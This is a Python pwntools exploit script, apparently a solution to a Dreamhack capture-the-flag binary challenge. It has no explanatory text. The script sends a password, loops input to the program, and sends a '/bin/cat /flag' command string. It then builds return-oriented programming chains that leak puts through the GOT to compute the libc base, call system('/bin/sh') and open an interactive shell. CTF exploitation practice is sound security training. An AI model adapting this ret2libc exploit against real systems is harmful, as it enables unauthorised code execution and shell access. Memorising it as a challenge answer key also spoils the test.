from pwn import *
context.update(arch='amd64', os='linux')
#p = remote("host1.dreamhack.games",  20260)
p = process("./prob", env={'LD_PRELOAD': './libc.so.6'})
# p = process("./prob")
libc = ELF("./libc.so.6")


p.sendafter(b"> ", b"Decision2Solve\x00\x00")

safe_addr = 0x404010
main_addr = 0x401446

p.send(p64(safe_addr))
p.send(b"\x46\x14\x40\x00\x00\x00")
p.sendafter(b"> ", b"1")

print(p.recv(79))

i = 0
while True:
    if (i == 1000):
        break
    p.sendafter(b"> ", b"a"*0x10)
    p.sendafter(b"> ", b"1")
    # sleep(0.01)
    i += 1
    print(i)
input()
p.sendafter(b"> ", b"/bin/cat /flag\x00\x00")
print("1")

puts_plt = 0x04010c0
puts_got = 0x403fa8
prdi_prbp_ret = 0x40129b
unsafe_func = 0x0401426

p.sendafter(b"> ", b"2")

pl = b"a"*32
pl += b"b"*8
pl += p64(0x40129e)
pl += p64(prdi_prbp_ret)
pl += p64(puts_got)
pl += b"c"*8
pl += p64(puts_plt)
pl += p64(unsafe_func)
pl += b"c"*(0x10000-len(pl))

p.send(pl)

libc_leak = u64(p.recv(6)[:]+b"\x00\x00")
print(f"[+] leak addr : {hex(libc_leak)}")
offset = 0x58ED0
libc_base = libc_leak - offset
print(f"[+] libc base addr : {hex(libc_base)}")
system = libc_base+0x28D64
print(f"[+] system addr : {hex(system)}")
binsh = libc_base+0x1B0698
print(f"[+] /bin/sh addr : {hex(binsh)}")

exit = 0x04012f6

pl = p64(binsh)*4
pl += p64(binsh)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(0x40129e)
pl += p64(prdi_prbp_ret)
pl += p64(binsh)
pl += p64(binsh)
pl += p64(system)
pl += p64(exit)
pl += b"\x00"*(0x10000-len(pl))


p.send(pl)
p.interactive()
